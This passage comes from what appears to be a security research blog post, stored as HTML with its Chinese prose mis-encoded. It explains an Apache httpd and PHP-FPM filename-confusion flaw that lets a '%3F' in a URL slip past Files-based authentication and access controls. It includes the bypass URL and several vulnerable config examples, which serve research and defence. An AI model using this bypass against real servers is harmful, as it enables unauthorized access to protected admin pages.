&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-1-2-acl-bypass&quot;&gt;‚öîÔ∏è Primitive 1-2. ACL Bypass&lt;/h4&gt;

&lt;p&gt;Filename Confusion ÁöÑÁ¨¨‰∫åÂÄãÊîªÊìäÊâãÊ≥ïÁôºÁîüÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; Ë∫´‰∏äÔºåÁõ∏ËºÉÂâç‰∏ÄÂÄãÊîªÊìäÊòØÁÑ°Ê¢ù‰ª∂Â∞áÁõÆÊ®ôÁï∂ÊàêÁ∂≤ÂùÄËôïÁêÜÔºåÈÄôÊ¨°ÂâáÊòØ&lt;strong&gt;Âõ†ÁÇ∫Ê®°ÁµÑÈñìÂ∞ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; ÁöÑÁêÜËß£‰∏ç‰∏ÄËá¥ÊâÄÂ∞éËá¥ÁöÑË™çË≠âÂèäÂ≠òÂèñÊéßÂà∂ÁπûÈÅé&lt;/strong&gt;ÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; ÊúÉÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; Áï∂ÊàêÁ∂≤ÂùÄÈÄô‰ª∂‰∫ãÊÉÖÂÖ∂ÂØ¶ÂæàÂêàÁêÜÔºåÂõ†ÁÇ∫ÂéüÊú¨ Proxy ÁöÑÁõÆÁöÑÂ∞±ÊòØÂ∞áË´ãÊ±Ç„ÄåÂ∞éÂêë„ÄçÂà∞ÂÖ∂ÂÆÉÁ∂≤ÂùÄ‰∏äÔºå‰ΩÜÂÆâÂÖ®ÂæÄÂæÄÂ∞±ÊòØÂñÆÁç®ÊãøÂá∫‰æÜÁúãÊ≤íÂïèÈ°åÔºåÊê≠ÈÖçÂú®‰∏ÄËµ∑Â∞±Âá∫ÂïèÈ°å‰∫ÜÔºÅ ÁâπÂà•ÊòØÁï∂Â§ßÂ§öÊï∏Ê®°ÁµÑÈ†êË®≠Â∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; Ë¶ñÁÇ∫Ê™îÊ°àÁ≥ªÁµ±Ë∑ØÂæëÊôÇÔºåË©¶ÊÉ≥‰∏Ä‰∏ãÂÅáË®≠‰ªäÂ§©‰Ω†‰ΩøÁî®Âü∫ÊñºÊ™îÊ°àÁ≥ªÁµ±ÁöÑÂ≠òÂèñÊéßÂà∂Ê®°ÁµÑÔºåËÄåÁèæÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; ÂèàÊúÉÊää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; Áï∂ÊàêÁ∂≤ÂùÄÔºåÈÄôÂÖ∂‰∏≠ÁöÑ‰∏ç‰∏ÄËá¥Â∞±ÂèØ‰ª•Â∞éËá¥Â≠òÂèñÊéßÂà∂ÊàñÊòØË™çË≠âË¢´ÁπûÈÅéÔºÅ&lt;/p&gt;

&lt;p&gt;‰∏ÄÂÄãÁ∂ìÂÖ∏ÁöÑ‰æãÂ≠êÊòØÔºåÁ∂≤Á´ôÁÆ°ÁêÜÂì°ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; Ë™ûÊ≥ïÂéªÂ∞çÂñÆ‰∏ÄÊ™îÊ°àÂä†‰∏äÈôêÂà∂Ôºå‰æãÂ¶Ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AuthType&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Basic&lt;/span&gt; 
    &lt;span class=&quot;ss&quot;&gt;AuthName&lt;/span&gt; &quot;Admin Panel&quot;
    &lt;span class=&quot;nc&quot;&gt;AuthUserFile&lt;/span&gt; &quot;/etc/apache2/.htpasswd&quot;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; valid-user
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âú®È†êË®≠ÂÆâË£ùÁöÑ PHP-FPM Áí∞Â¢É‰∏≠ÔºåÈÄôÁ®ÆË®≠ÂÆöÂèØ‰ª•Ë¢´Áõ¥Êé•ÁπûÈÅéÔºÅ È†ÜÈÅì‰∏ÄÊèêÈÄô‰πüÊòØ Apache HTTP Server ‰∏≠ÊúÄÂ∏∏Ë¶ãÂà∞ÁöÑË™çË≠âÊñπÂºèÔºÅ ÂÅáË®≠‰ªäÂ§©‰Ω†ÁÄèË¶Ω‰∫ÜÈÄôÊ®£ÁöÑÁ∂≤ÂùÄÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/admin.php%3Fooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;È¶ñÂÖàÂú®ÈÄôÂÄãÁ∂≤ÂùÄÁöÑ HTTP ÁîüÂëΩÈÄ±Êúü‰∏≠ÔºåË™çË≠âÊ®°ÁµÑÊúÉÂ∞áË´ãÊ±ÇÁöÑÊ™îÊ°àÂêçÁ®±ËàáË¢´‰øùË≠∑ÁöÑÊ™îÊ°àÈÄ≤Ë°åÊØîÂ∞çÔºåÊ≠§ÊôÇ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; Ê¨Ñ‰ΩçÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php?ooo.php&lt;/code&gt; ÁêÜÊâÄÁï∂ÁÑ∂Ëàá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt; ‰∏çÁ¨¶ÂêàÔºåÊñºÊòØÊ®°ÁµÑÊúÉË™çÁÇ∫Áï∂ÂâçË´ãÊ±Ç‰∏çÈúÄË¶ÅË™çË≠â„ÄÇ ÁÑ∂ËÄå PHP-FPM ÁöÑË®≠ÂÆöÊ™îÊ°àÂèàË®≠ÂÆöÁï∂Êî∂Âà∞ÁµêÂ∞æÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; ÁöÑË´ãÊ±ÇÊôÇÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetHandler&lt;/code&gt; Ë™ûÊ≥ïÂ∞áË´ãÊ±ÇËΩâ‰∫§Áµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /etc/apache2/mods-enabled/php8.2-fpm.conf&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Using (?:pattern) instead of (pattern) is a small optimization that&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# avoid capturing the matching pattern (as $1) which isn&apos;t used here&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;.+\.ph(?:ar|p|tml)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; &quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; ÊúÉÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; ÈáçÂØ´Êàê‰ª•‰∏ãÁ∂≤ÂùÄ‰∏¶Ê†πÊìöÂÖ∂‰∏≠ÁöÑÂçîË≠∞ÂëºÂè´Â≠êÊ®°ÁµÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_fcgi&lt;/code&gt; ËôïÁêÜÂæåÁ∫å FastCGI ÂçîË≠∞ÁöÑÈÇèËºØÔºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Áî±ÊñºÈÄôÊôÇÂæåÁ´ØÂú®Êî∂Âà∞Ê™îÊ°àÂêçÁ®±ÊôÇÂ∑≤Á∂ìÊòØ‰∏ÄÂÄãÂ•áÊÄ™ÁöÑÊ†ºÂºè‰∫ÜÔºåPHP-FPM Âè™Â•ΩÂ∞çÈÄôÂÄãË°åÁÇ∫ÂÅöÁâπÂà•ËôïÁêÜÔºåÂÖ∂‰∏≠ËôïÁêÜÁöÑÈÇèËºØÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044&quot;&gt;sapi/fpm/fpm/fpm_main.c#L1044&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define APACHE_PROXY_FCGI_PREFIX &quot;proxy:fcgi://&quot;
#define APACHE_PROXY_BALANCER_PREFIX &quot;proxy:balancer://&quot;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strncasecmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* advance to first character of hostname */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* move past hostname and port */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apache_was_here&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ignore query string if sent by Apache (RewriteRule) */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞ PHP-FPM ÂÖàÂ∞çÊ™îÊ°àÂêçÁ®±Ê≠£Ë¶èÂåñ‰∏¶Â∞çÂÖ∂‰∏≠ÁöÑÂïèËôü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; ÈÄ≤Ë°åÂàÜÈöîÂèñÂá∫ÂÖ∂‰∏≠ÂØ¶ÈöõÁöÑÊ™îÊ°àË∑ØÂæë‰∏¶Âü∑Ë°å (‰πüÂ∞±ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/admin.php&lt;/code&gt;)„ÄÇ ÊâÄ‰ª•Âü∫Êú¨‰∏ä&lt;strong&gt;ÊâÄÊúâ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; Ë™ûÊ≥ïÈáùÂ∞çÂñÆ‰∏Ä PHP Ê™îÊ°àÁöÑË™çË≠âÊàñÊòØÂ≠òÂèñÊéßÂà∂Ë®≠ÂÆöÂú®ÈÅãË°å PHP-FPM ÁöÑÊÉÖÂ¢É‰∏ãÈÉΩÂ≠òÂú®È¢®Èö™ÔºÅ&lt;/strong&gt; üòÆ&lt;/p&gt;

&lt;p&gt;Âæû GitHub ‰∏äÂèØ‰ª•ÊâæÂà∞ÈùûÂ∏∏Â§öÊΩõÂú®ÊúâÈ¢®Èö™ÁöÑË®≠ÂÆöÔºå‰æãÂ¶ÇË¢´ÈôêÂà∂Âú®Âè™ÊúâÂÖßÁ∂≤ÊâçËÉΩÂ≠òÂèñÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# protect phpinfo, only allow localhost and local network access&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; php-info.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# LOCAL ACCESS ONLY&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Require local &lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# LOCAL AND LAN ACCESS&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; ip 10 172 192.168
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; ÈòªÊìãËµ∑‰æÜÁöÑ AdminerÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; adminer.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ë¢´‰øùË≠∑Ëµ∑‰æÜÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmlrpc.php&lt;/code&gt;Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; xmlrpc.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Èò≤Ê≠¢Áõ¥Êé•Â≠òÂèñÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑Ôºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;cron.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄèÈÅéË™çË≠âÊ®°ÁµÑ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; ÈñìÂ∞ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; Ê¨Ñ‰ΩçÁêÜËß£ÁöÑ‰∏ç‰∏ÄËá¥Ôºå‰∏äÈù¢ÊâÄÊúâÁöÑ‰æãÂ≠êÈÉΩÂèØ‰ª•ÈÄèÈÅé‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; ÊàêÂäüÁπûÈÅéÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-2-documentroot-confusion&quot;&gt;üî• 2. DocumentRoot Confusion&lt;/h3&gt;

&lt;p&gt;Êé•‰∏ã‰æÜË¶Å‰ªãÁ¥πÁöÑÊîªÊìäÊòØÂü∫Êñº DocumentRoot ‰∏äÁöÑ Confusion AttackÔºÅ È¶ñÂÖà‰Ω†ÂèØ‰ª•ÊÄùËÄÉ‰∏Ä‰∏ãÔºåÂ∞çÊñº‰∏ãÈù¢ÈÄôÊ®£Â≠êÁöÑ Httpd Ë®≠ÂÆöÔºö&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^/html/(.*)$   /$1.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áï∂ÁÄèË¶Ω &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/html/about&lt;/code&gt; ÊôÇÔºåÂà∞Â∫ïÂØ¶Èöõ Httpd ÊúÉÈñãÂïüÂì™ÂÄãÊ™îÊ°àÔºü ÊòØÊ†πÁõÆÈåÑ‰∏ãÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/about.html&lt;/code&gt; ÈÇÑÊòØ DocumentRoot ‰∏ãÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/about.html&lt;/code&gt; Âë¢Ôºü&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Á≠îÊ°àÊòØ ‚Äî‚Äî &lt;strong&gt;ÂÖ©ÂÄãË∑ØÂæëÈÉΩÊúÉÂ≠òÂèñ&lt;/strong&gt;„ÄÇ ÈÄô‰πüÊòØÊàëÂÄëÁöÑÁ¨¨‰∫åÂÄã Confusion AttackÔºå&lt;strong&gt;Â∞çÊñº‰ªªÊÑè&lt;sup&gt;[1]&lt;/sup&gt;ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;ÔºåHttpd Á∏ΩÊòØÊúÉÂòóË©¶ÈñãÂïüÂ∏∂Êúâ DocumentRoot ÁöÑË∑ØÂæë‰ª•ÂèäÊ≤íÊúâÁöÑË∑ØÂæëÔºÅ&lt;/strong&gt; ÊúâË∂£Âêß üòâ&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] ‰ΩçÊñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; Êàñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost Block&lt;/code&gt; ÂÖß&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939&quot;&gt;modules/mappers/mod_rewrite.c#L4939&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPTION_LEGACY_PREFIX_DOCROOT&lt;/span&gt;&lt;span 